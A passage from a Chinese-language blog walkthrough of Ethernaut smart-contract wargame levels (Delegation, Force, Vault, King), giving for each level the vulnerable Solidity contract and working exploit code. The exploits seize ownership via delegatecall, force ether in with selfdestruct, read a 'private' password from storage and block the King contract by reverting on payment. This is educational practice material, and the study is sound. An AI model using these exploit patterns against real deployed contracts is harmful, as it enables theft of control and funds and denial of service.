<p>看上去有点绕，举个例子，假如你调用（使用<code>call</code>的方式）一个合约A中的某个函数，这个函数又使用<code>delegatecall</code>的方式调用了合约B的函数，如果合约B中的函数发生了状态（<code>storage</code>）改变，<strong>则改变的是A中的状态</strong>，同时，在B看来，<strong>msg的值是和你相关的</strong>（即msg.sender是你的地址）</p>
<p><img src="https://cdn.yalexin.top/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20230218130024.png" alt></p>
<p><img src="https://cdn.yalexin.top/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20230218130226.png" alt></p>
<p>回归到本关卡，我们要想办法执行<code>fallback()</code>函数，然后想办法借助<code>delegatecall</code>函数执行<code>pwn</code>函数，如此一来，就能改变<code>Delegation</code>合约中的<code>owner</code>变量了，具体而言，是改成我们的地址。</p>
<p><code>delegatecall</code>用法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">address.delegatecall(二进制编码数据)</span><br></pre></td></tr></table></figure>

<p>二进制编码利用结构化编码函数 abi.encodeWithSignature 获得：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abi.encodeWithSignature(&quot;函数签名&quot;,逗号分隔的具体参数)</span><br></pre></td></tr></table></figure>

<p>例如<code>abi.encodeWithSignature(&quot;f1(uint256,address)&quot;,_x, _addr)</code></p>
<p>对于本关卡，我们可以借助一个合约：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">contract T &#123;</span><br><span class="line">    function foo() pure public returns(bytes memory result)&#123;</span><br><span class="line">        result &#x3D; abi.encodeWithSignature(&quot;pwn()&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>部署后，调用<code>foo</code>函数可以得到返回值<code>0xdd365b8b</code>。</p>
<p>然后我们可以在控制台中输入：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.sendTransaction(&#123;<span class="attr">data</span>:<span class="string">'0xdd365b8b'</span>&#125;);</span><br></pre></td></tr></table></figure>

<p>然后查询</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.owner()</span><br></pre></td></tr></table></figure>

<p>如果是你的地址，则说明成功了。</p>
<h2 id="Force"><a href="#Force" class="headerlink" title="Force"></a>Force</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Force &#123;&#x2F;*</span><br><span class="line"></span><br><span class="line">                   MEOW ?</span><br><span class="line">         &#x2F;\_&#x2F;\   &#x2F;</span><br><span class="line">    ____&#x2F; o o \</span><br><span class="line">  &#x2F;~____  &#x3D;ø&#x3D; &#x2F;</span><br><span class="line"> (______)__m_m)</span><br><span class="line"></span><br><span class="line">*&#x2F;</span><br></pre></td></tr></table></figure>

<p><strong>通关条件</strong>：将合约的余额提升至大于0.</p>
<p><img src="https://cdn.yalexin.top/v2-7e6e4f830bc320cded2e3972596be27a_r.jpg" alt></p>
<p>去网上看了看别人的做法，才知道是使用<code>selfdestruct</code>函数</p>
<blockquote>
<p><code>selfdestruct</code>由以太坊智能合约提供，用于销毁区块链上的合约系统。当合约执行自毁操作时，合约账户上剩余的以太币会发送给指定的目标，然后其存储和代码从状态中被移除。然而，自毁函数也是一把双刃剑，一方面它可以使开发人员能够从以太坊中删除智能合约并在紧急情况下转移以太币。另一方面自毁函数也可能成为攻击者的利用工具，攻击者可以利用该函数向目标合约“<strong>强制转账</strong>”，此时并不会触发目标合约的fallback函数，因此不需要该合约有任何的<code>payable</code>函数，从而影响目标合约的正常功能</p>
</blockquote>
<p>因此我们借助一个合约：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract ForceAttack &#123;</span><br><span class="line">    function attack(address _addr) payable public &#123;</span><br><span class="line">        selfdestruct(payable(_addr));</span><br><span class="line">    &#125;</span><br><span class="line">    fallback()payable external&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>部署后，先往该攻击合约中转入少许以太币，然后再调用<code>attack</code>函数即可。</p>
<h2 id="Vault"><a href="#Vault" class="headerlink" title="Vault"></a>Vault</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Vault &#123;</span><br><span class="line">  bool public locked;</span><br><span class="line">  bytes32 private password;</span><br><span class="line"></span><br><span class="line">  constructor(bytes32 _password) &#123;</span><br><span class="line">    locked &#x3D; true;</span><br><span class="line">    password &#x3D; _password;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function unlock(bytes32 _password) public &#123;</span><br><span class="line">    if (password &#x3D;&#x3D; _password) &#123;</span><br><span class="line">      locked &#x3D; false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>通关条件</strong>：将变量<code>locked</code>改为<code>false</code>.</p>
<p>看上去<code>password</code>是私有的，我们无法查看，但是这里有点“<strong>此地无银三百两</strong>”的味道在里边。</p>
<p>private 定义的函数和状态变量只对定义它的合约可见，该合约派生的合约都不能调用和访问该函数及状态变量。</p>
<p>在合约之外，我们仍然可以获取该变量的值，因为智能合约最终都会写进链上，包括<code>storage</code>，而变量属于<code>storage</code>。</p>
<p>我们参考<code>web3.js</code><a href="https://learnblockchain.cn/docs/web3.js/web3-eth.html?highlight=getstorageat#getstorageat" target="_blank" rel="noopener">【文档】</a>,使用<strong>getStorageAt</strong>函数读取指定内存：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">web3.eth.getStorageAt(address, position [, defaultBlock] [, callback])</span><br></pre></td></tr></table></figure>

<p><strong>参数</strong></p>
<ol>
<li><code>String</code> - 用来获取存储值的地址。</li>
<li><code>Number|String|BN|BigNumber</code> - 存储的索引位置。</li>
<li><code>Number|String|BN|BigNumber</code> - (可选) 如果传入值则会覆盖通过 <a href="https://learnblockchain.cn/docs/web3.js/web3-eth.html?highlight=getstorageat#eth-defaultblock" target="_blank" rel="noopener">web3.eth.defaultBlock</a> 设置的默认区块号。预定义的区块号可以使用 <code>&quot;latest&quot;</code>, <code>&quot;earliest&quot;</code> <code>&quot;pending&quot;</code>, 和 <code>&quot;genesis&quot;</code> 等值。</li>
<li><code>Function</code> - (可选) 可选的回调函数，其第一个参数为错误对象，第二个参数为函数运行结果。</li>
</ol>
<p>我们可以在控制台输入：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> web3.eth.getStorageAt(<span class="string">"0x743e4DdB7A7415D8B4B91b6943AdD4749fa6bd27"</span>, <span class="string">"1"</span>)</span><br></pre></td></tr></table></figure>

<p>其中前面第一个参数是合约的地址，调用<code>contract</code>可以获取。后面的参数是偏移量。</p>
<p>返回了<code>0x412076657279207374726f6e67207365637265742070617373776f7264203a29</code>，实际上就是<code>password</code>变量。</p>
<p>我们将其作为参数，调用<code>unlock</code>函数即可。</p>
<p>实际上，我们将该密码解码，是一个字符串<code>A very strong secret password :)</code></p>
<h2 id="King"><a href="#King" class="headerlink" title="King"></a>King</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract King &#123;</span><br><span class="line"></span><br><span class="line">  address king;</span><br><span class="line">  uint public prize;</span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor() payable &#123;</span><br><span class="line">    owner &#x3D; msg.sender;  </span><br><span class="line">    king &#x3D; msg.sender;</span><br><span class="line">    prize &#x3D; msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    require(msg.value &gt;&#x3D; prize || msg.sender &#x3D;&#x3D; owner);</span><br><span class="line">    payable(king).transfer(msg.value);</span><br><span class="line">    king &#x3D; msg.sender;</span><br><span class="line">    prize &#x3D; msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function _king() public view returns (address) &#123;</span><br><span class="line">    return king;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>本关卡类似一个庞氏骗局，即任何人只要往该合约充值的钱数A大于上一任国王的钱数B，那他将会变成新的国王，同时旧国王将会得到数量为A的钱。</p>
</blockquote>
<p><strong>通关条件</strong>：提交实例后，系统将会尝试将王权拿走，你要阻止这一过程，即合约王权不会被更改（<strong>别想着往里边充值大量以太币，这个办法行不通</strong>）。</p>
<p>本关卡利用点是<code>transfer</code>。即我们获取王权后，尝试<strong>拒绝系统的转账</strong>。</p>
<p>智能合约中，有三种方式进行转账，分别是：</p>
<p><strong><code>send</code></strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;address payable&gt;.send(uint256 amount) returns (bool)</span><br></pre></td></tr></table></figure>

<p>向<code>address</code>转入<code>amount</code>，如果异常会转账失败，仅会返回false，不会终止执行（合约地址转账）,有gas限制，最大2300</p>
<p><strong><code>transfer</code></strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;address payable&gt;.transfer(uint256 amount)</span><br></pre></td></tr></table></figure>

<p>如果异常会转账失败，抛出异常(等价于requi(send()))（合约地址转账），有gas限制，最大2300。</p>
<p><strong><code>call</code></strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;address&gt;.call(bytes memory) returns (bool, bytes memory)</span><br></pre></td></tr></table></figure>

<p>如果异常会转账失败，仅会返回false，不会终止执行（调用合约的方法并转账）,没有gas限制.</p>
<p>从上面可以看出，当<code>transfer</code>出现异常时候，第19、20行就不被执行，即我们应该尝试触发一个异常，借助下面的合约，我们即可完成</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract KingAttack &#123;</span><br><span class="line"></span><br><span class="line">  	constructor(address payable  contract_addr) payable &#123;</span><br><span class="line">          contract_addr.call&#123;value:0.001 ether&#125;(&quot;&quot;);</span><br><span class="line">  	&#125;</span><br><span class="line">    fallback()payable external&#123;</span><br><span class="line">    &#x2F;&#x2F; 触发异常，阻止King合约的19、20行的执行</span><br><span class="line">    	revert();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们要先将我们的<code>KingAttack</code>合约部署，部署的时候同时转入<code>0.001 ether</code>(因为King合约中的<code>prize</code>为<code>0.001ether</code>)。部署完毕后，输入<code>await contract._king()</code>，如果返回的是我们<code>KingAttack</code>的地址，则说明我们获得了王权，此时直接提交实例即可。</p>

    </div>

    
    <div class="about">
        <h1>About this Post</h1>
        <div class="details">
            <p>This post is written by YaleXin, licensed under <a href="https://creativecommons.org/licenses/by-nc/4.0" target="_blank" rel="noopener">CC BY-NC 4.0</a>.</p>
        </div>
        
        <p class="tags">
            
            <i class="icon"></i>
            <a href="/tags/Solidity/" class="tag">#Solidity</a><a href="/tags/Web3-0/" class="tag">#Web3.0</a>
        </p>
        
    </div>
    

    <div class="container post-prev-next">
        
        <a href="/2023/03/11/%E3%80%90Ethernaut%E9%97%AF%E5%85%B3%E5%BD%95%E3%80%91%E4%B8%AD%E7%AF%87/" class="next">
            <div>
                <div class="text">
                    <p class="label">Next</p>
                    <h3 class="title">【Ethernaut闯关录】中篇</h3>
                </div>
            </div>
        </a>
        
        
        <a href="/2023/01/02/%E9%93%BE%E5%8D%9A%E2%80%94%E2%80%94DAPP%E7%BB%83%E6%89%8B%E9%A1%B9%E7%9B%AE%EF%BC%88%E4%B8%89%EF%BC%89/" class="prev">
            <div>
                <div class="text">
                    <p class="label">Previous</p>
                    <h3 class="title">链博--DAPP练手项目（三）</>
                </div>
            </div>
        </a>
        
    </div>

    
        
        
    
</article>

        <footer>
    <div class="inner">
        <div class="links">
            
            <div class="group">
                <h2 class="title">Blog</h2>
                
                <a href="/" class="item">Blog</a>
                
                <a href="/archives" class="item">Archives</a>
                
                <a href="/tags" class="item">Tags</a>
                
                <a href="/categories" class="item">Categories</a>
                
                <a href="/search" class="item">Search</a>
                
                <a href="/friends" class="item">Friends</a>
                
                <a href="/projects" class="item">Projects</a>
                
                <a href="/resume" class="item">Resume</a>
                
                <a href="/about" class="item">About</a>
                
                <a href="/atom.xml" class="item">RSS</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Projects</h2>
                
                <a href="https://github.com/MrWillCom/rsa-cli" target="_blank" rel="noopener" class="item">RSA CLI</a>
                
                <a href="https://github.com/MrWillCom/hexo-theme-cupertino" target="_blank" rel="noopener" class="item">Hexo Theme Cupertino</a>
                
                <a href="https://github.com/MrWillCom/a-calendar" target="_blank" rel="noopener" class="item">A Calendar</a>
                
                <a href="https://github.com/MrWillCom/auto-mirroring-bucket" target="_blank" rel="noopener" class="item">Auto Mirroring Bucket</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Me</h2>
                
                <a href="https://github.com/MrWillCom" target="_blank" rel="noopener" class="item">GitHub</a>
                
                <a href="https://codepen.io/mrwillcom" target="_blank" rel="noopener" class="item">CodePen</a>
                
                <a href="https://www.patreon.com/MrWillCom" target="_blank" rel="noopener" class="item">Patreon</a>
                
                <a href="https://noc.social/@MrWillCom" target="_blank" rel="noopener" class="item">Mastodon</a>
                
                <a href="https://discord.gg/UKuFDjcfY8" target="_blank" rel="noopener" class="item">Discord</a>
                
                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
                
            </div>
            
        </div>
        <span>&copy; 2024 YaleXin<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
        
        
            <br>
            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
                <label>
                    <input type="radio" value="light">
                    <span>Light</span>
                </label>
                <label>
                    <input type="radio" value="dark">
                    <span>Dark</span>
                </label>
                <label>
                    <input type="radio" value="auto">
                    <span>Auto</span>
                </label>
            </div>
        
    </div>
</footer>


        
<script src="/js/main.js"></script>

        
        
        

        
        <script src="https://unpkg.com/scrollreveal"></script>
        <script>
            window.addEventListener('load', () => {
                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
                ScrollReveal().reveal('.post-list-item .cover-img img')
                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
            })
        </script>
        
    </body>
</html>